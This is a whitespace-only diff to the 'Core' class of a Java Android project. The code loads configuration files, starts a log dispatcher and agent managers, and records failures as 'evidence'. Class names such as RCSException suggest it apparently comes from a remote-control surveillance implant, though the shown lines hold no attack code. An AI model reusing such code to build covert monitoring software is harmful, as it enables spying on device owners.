@@ -309,16 +309,20 @@ public class Core extends Activity implements Runnable {
 
 			// Identify the device uniquely
 			final Device device = Device.self();
+			
 			int ret = loadConf();
+			
 			if (ret == 0) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " Error: Cannot load conf"); //$NON-NLS-1$
 				}
+				
 				return ConfType.Error;
 			}
 
 			// Start log dispatcher
 			final LogDispatcher logDispatcher = LogDispatcher.self();
+			
 			if (!logDispatcher.isAlive()) {
 				logDispatcher.start();
 			}
@@ -328,6 +332,7 @@ public class Core extends Activity implements Runnable {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " eventManager FAILED"); //$NON-NLS-1$
 				}
+				
 				return ConfType.Error;
 			}
 
@@ -339,12 +344,14 @@ public class Core extends Activity implements Runnable {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " agentManager FAILED"); //$NON-NLS-1$
 				}
+				
 				return ConfType.Error;
 			}*/
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Info: Agents started"); //$NON-NLS-1$
 			}
+			
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " Core initialized"); //$NON-NLS-1$
 			}
@@ -356,7 +363,6 @@ public class Core extends Activity implements Runnable {
 				Check.log(rcse);//$NON-NLS-1$
 				Check.log(TAG + " RCSException() detected"); //$NON-NLS-1$
 			}
-
 		} catch (final Exception e) {
 			if (Cfg.DEBUG) {
 				Check.log(e);//$NON-NLS-1$
@@ -365,12 +371,12 @@ public class Core extends Activity implements Runnable {
 		}
 
 		return ConfType.Error;
-
 	}
 
 	public boolean verifyNewConf() {
 		AutoFile file = new AutoFile(Path.conf() + ConfType.NewConf);
 		boolean loaded = false;
+		
 		if (file.exists()) {
 			loaded = loadConfFile(file, false);
 		}
@@ -409,8 +415,10 @@ public class Core extends Activity implements Runnable {
 		// get the actual configuration
 		if (!loaded) {
 			file = new AutoFile(Path.conf() + ConfType.ActualConf);
+			
 			if (file.exists()) {
 				loaded = loadConfFile(file, true);
+				
 				if (!loaded) {
 					Evidence.info(Messages.getString("30.4")); //$NON-NLS-1$
 				} else {
@@ -462,6 +470,7 @@ public class Core extends Activity implements Runnable {
 				Check.log(TAG + " (loadConfFile) Error: " + e);
 			}
 		}
+		
 		return loaded;
 	}
 
